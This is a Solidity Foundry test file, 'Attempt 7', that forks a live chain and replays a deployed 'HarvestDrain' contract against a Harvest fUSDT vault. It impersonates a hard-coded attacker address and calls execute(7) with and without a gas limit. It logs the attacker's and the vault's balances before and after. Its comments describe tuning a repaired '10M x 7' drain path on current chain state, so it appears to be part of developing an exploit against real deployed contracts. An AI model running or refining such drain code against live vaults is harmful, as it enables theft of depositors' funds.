// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IHarvestDrainExecA7 {
    function execute(uint256 iterations) external;
}

interface IHVaultA7 {
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

/// @title Harvest Attempt 7
/// @notice Replays the exact live deployed `HarvestDrain` contract on the current fork head.
/// @dev Hypothesis: the repaired `10M x 7` path is valid on the latest live fork state and any
///      remaining failure is caused by post-deployment state drift rather than the callback fix.
contract Attempt7 is Test {
    address payable internal constant ATTACKER = payable(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);
    IHVaultA7 internal constant FUSDT_VAULT = IHVaultA7(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH2_HARVEST"));
    }

    function test_replay_live_drain_execute7() public {
        address liveDrain = vm.envOr("HARVEST_TEST_DRAIN", address(0x71e387efB685868D960B854a8c1a60bc16149bca));

        console.log("LIVE_BLOCK:", block.number);
        console.log("LIVE_DRAIN:", liveDrain);
        console.log("LIVE_NATIVE_BEFORE:", ATTACKER.balance);
        console.log("LIVE_VAULT_BEFORE:", FUSDT_VAULT.underlyingBalanceWithInvestment());

        vm.startPrank(ATTACKER);
        try IHarvestDrainExecA7(liveDrain).execute(7) {
            console.log("LIVE_EXECUTE_OK");
        } catch {
            console.log("LIVE_EXECUTE_REVERT");
        }
        vm.stopPrank();

        console.log("LIVE_NATIVE_AFTER:", ATTACKER.balance);
        console.log("LIVE_VAULT_AFTER:", FUSDT_VAULT.underlyingBalanceWithInvestment());
    }

    function test_replay_live_drain_execute7_with_gas_limit() public {
        uint256 gasLimit = vm.envUint("HARVEST_TEST_GAS_LIMIT");
        address liveDrain = vm.envOr("HARVEST_TEST_DRAIN", address(0x71e387efB685868D960B854a8c1a60bc16149bca));

        console.log("LIVE_BLOCK:", block.number);
        console.log("LIVE_DRAIN:", liveDrain);
        console.log("LIVE_GAS_LIMIT:", gasLimit);

        vm.startPrank(ATTACKER);
        (bool ok,) = liveDrain.call{gas: gasLimit}(abi.encodeWithSignature("execute(uint256)", 7));
        vm.stopPrank();

        console.log("LIVE_GAS_LIMIT_OK:", ok);
    }
}
